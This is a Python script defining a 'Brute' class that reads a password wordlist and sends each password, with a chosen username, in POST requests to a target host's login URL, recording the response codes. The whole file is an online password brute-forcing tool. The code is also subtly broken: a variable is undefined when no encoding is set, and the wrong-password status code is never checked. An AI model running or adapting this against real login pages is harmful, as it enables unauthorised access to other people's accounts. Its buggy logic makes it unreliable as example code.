import requests
import hashlib
import threading
import time
from encrypt import encode_base64,encrypt_md5
import requests

class Brute():

    #TODO:Implement option for username lists
    def __init__(self,host,port,url,passwords_file,pass_enc_type,user_name,wrong_pass_response_status_code = '200'):
        self.target = 'http://' + host + ":" + port + url 
        print(self.target)
        try:
            passwords_file = open(passwords_file,'r')
            
        except:
            print("passwords file not found")
        try:
            self.passwords_list = passwords_file.readlines()
        except Exception as e:
            print(str(e))
        self.username = user_name
        
        self.password_encryption_type = pass_enc_type if pass_enc_type else False
        self.wrong_pass_response_status_code = wrong_pass_response_status_code

    def brutalize(self):
        result=[]
        if self.password_encryption_type:
            encrypted_passwords = encode_base64(self.passwords_list)
        for password in encrypted_passwords:
            payload = {
                "username":self.username,
                "password":password
            }
            try:
                response = requests.post(self.target, data=payload)
                result.append(f'Tried {password}: response was {response.status_code}')
            except Exception as e: 
                return str(e)
            
        return result

                
        
    


  

